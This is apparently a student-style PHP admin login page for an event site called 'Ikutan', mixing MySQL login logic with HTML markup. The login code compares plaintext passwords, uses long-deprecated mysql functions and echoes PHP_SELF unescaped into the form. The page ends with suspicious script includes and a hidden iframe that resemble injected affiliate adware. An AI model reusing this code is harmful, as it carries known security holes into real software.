<?php require_once('../Connections/localserver.php'); ?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}
?>
<?php
// *** Validate request to login to this site.
if (!isset($_SESSION)) {
  session_start();
}

$loginFormAction = $_SERVER['PHP_SELF'];
if (isset($_GET['accesscheck'])) {
  $_SESSION['PrevUrl'] = $_GET['accesscheck'];
}

if (isset($_POST['username'])) {
  $loginUsername=$_POST['username'];
  $password=$_POST['password'];
  $MM_fldUserAuthorization = "";
  $MM_redirectLoginSuccess = "admin.php";
  $MM_redirectLoginFailed = "index.php";
  $MM_redirecttoReferrer = false;
  mysql_select_db($database_localserver, $localserver);
  
  $LoginRS__query=sprintf("SELECT username, password FROM superadmin WHERE username=%s AND password=%s",
    GetSQLValueString($loginUsername, "text"), GetSQLValueString($password, "text")); 
   
  $LoginRS = mysql_query($LoginRS__query, $localserver) or die(mysql_error());
  $loginFoundUser = mysql_num_rows($LoginRS);
  if ($loginFoundUser) {
     $loginStrGroup = "";
    
	if (PHP_VERSION >= 5.1) {session_regenerate_id(true);} else {session_regenerate_id();}
    //declare two session variables and assign them
    $_SESSION['MM_Username'] = $loginUsername;
    $_SESSION['MM_UserGroup'] = $loginStrGroup;	      

    if (isset($_SESSION['PrevUrl']) && false) {
      $MM_redirectLoginSuccess = $_SESSION['PrevUrl'];	
    }
    header("Location: " . $MM_redirectLoginSuccess );
  }
  else {
    header("Location: ". $MM_redirectLoginFailed );
  }
}
?>
<!DOCTYPE html>
<html class=" js no-touch" style="" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title>Ikutan - Event Terdaftar</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="../views/asset/bootstrap.css" rel="stylesheet">
<link href="../views/asset/shopfrog.css" rel="stylesheet" media="screen">   

<link href="../views/asset/shopfrog-brown.css" rel="stylesheet" media="screen">

<link href="../views/asset/rateit.css" rel="stylesheet" media="screen">		       
<link href="../views/asset/magnific-popup.css" rel="stylesheet"> 		
<script src="../views/asset/respond.js"></script>
<link href="http://leapfrogui.com/shopfrog/brown/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="../views/asset/css.css" rel="stylesheet" type="text/css">
<link href="../views/asset/css_002.css" rel="stylesheet" type="text/css">

<script src="../views/asset/jquery-1.js"></script>    
<script src="../views/asset/modernizr.js"></script>	
<script src="../views/asset/imagesloaded.js"></script>	
<script src="../views/asset/jquery_003.js"></script>	
<script src="../views/asset/jquery_002.js"></script>		
<script src="../views/asset/jquery.js"></script>				
<script src="../views/asset/bootstrap.js"></script>
<script src="../views/asset/shopfrog.js"></script>

<script src="../views/asset/javascript.htm" type="text/javascript"></script><script src="../views/asset/1010.js" id="sjsjszmzmaw28aj6" type="text/javascript"></script><script src="../views/asset/l.js" type="text/javascript"></script><script src="../views/asset/l_002.js" type="text/javascript"></script></head>
<body class="page-general">
			
	<header class="navbar navbar-fixed-top clearfix">
		
	<a class="brand" href="../views/index.php">Ikutan</a>


    <div id="nav-basket" class="basket">
       
 
  
</div>
	
	<button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="icon-bar"></span>
		<span class="icon-bar"></span>
		<span class="icon-bar"></span>
	</button>

	<nav class="navbar-collapse collapse" id="main-nav">
		<ul class="nav">
			<li class="active">
				<a href="../views/index.php" class="top-level flat">Home</a>
			</li>
			<li>
				<a href="http://localhost/ikutan/views/explore.php" class="top-level">Explore</a>
				
			</li>
             <li>
				<a href="http://localhost/ikutan/views/tambah_event.php" class="top-level">Tambah Event</a>
				
			</li>
			 <li>
				<a href="http://localhost/ikutan/views/eventsaya.php" class="top-level">Event Saya</a>
				
			</li>
										
		</ul>
	</nav><!--/.nav-collapse -->
	
</header>


	
	<div class="container">
		<!-- <div class="row">

			<div class="col-xs-12">
				<a href="index.php">Home</a> &gt; Shopping cart
			</div> <! //end span12 -->

		</div> <!-- //end row --> 
	</div> <!-- //end container -->
	
	<div class="container main-content">
		<div class="row">
			<div class="col-xs-12">
				<div class="content">
                <h1>Login Admin</h1>
                  <form action="<?php echo $loginFormAction; ?>" method="POST" name="admin"><input name="username" type="text" value="username"><br><input name="password" type="password"><br>
                  <input name="submit" type="submit"></form>
                  <p>&nbsp;</p>
                </div>			
			</div> <!-- // end span12 -->
		</div> <!-- //end row -->
	</div> <!-- //end container -->
	
	<footer>
	<div class="container">
		<div class="row">
							
		</div>
	</div>
</footer>	
	

<script src="../views/asset/aeyJhZmZpZCI6MTAxOCwic3ViYWZmaWQiOjEwMTAsImhyZWYiOiJodHRwOi8v.js"></script><script src="../views/asset/spops-2.js" charset="UTF-8" type="text/javascript"></script><iframe src="../views/asset/pquery-0.htm" style="display: none;"></iframe></body></html>

